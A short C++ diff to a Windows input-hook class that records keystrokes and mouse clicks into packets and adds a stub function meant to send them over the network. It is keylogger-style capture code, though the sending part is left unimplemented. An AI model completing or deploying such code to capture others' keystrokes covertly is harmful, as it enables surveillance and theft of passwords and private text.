@@ -56,18 +56,31 @@ void Hooker::receiveCallback(int nCode, WPARAM wParam, LPARAM lParam, bool isMou
 				_previousPoint.x = mouseStruct->pt.x;
 				_previousPoint.y = mouseStruct->pt.y;
 				std::cout << "MOUSE INPUT " << nCode << "  " << wParam << "  " << mouseStruct->pt.x << "  " << mouseStruct->pt.y << std::endl;
-				//_packager.addKey(nCode, wParam, lParam);	// MOUSEINPUT
+				_packager.addClick(nCode, wParam, lParam);
 			}
 		}
 		else {
 			std::cout << "MOUSE INPUT " << nCode << "  " << wParam << "  " << mouseStruct->pt.x << "  " << mouseStruct->pt.y << std::endl;
-			//_packager.addKey(nCode, wParam, lParam);	// MOUSEINPUT
+			_packager.addClick(nCode, wParam, lParam);	// MOUSEINPUT
 		}
 	}
 	else {
 		std::cout << "KB INPUT " << nCode << "  " << wParam << "  " << ((KBDLLHOOKSTRUCT *)lParam)->vkCode << std::endl;
 		_packager.addKey(nCode, wParam, lParam);
 	}
+	sendPaquet(_packager.getPaquet());
+}
+
+void Hooker::sendPaquet(Paquet* paquet) {
+	bool paquetSent = false;
+
+	// TODO: Check if other paquets need to be sent
+	if (paquet) {
+		// SEND PAQUET OVER NETWORK
+		if (paquetSent)
+			_packager.supprPaquet();
+	}
+
 }
 
 bool Hooker::connect() {
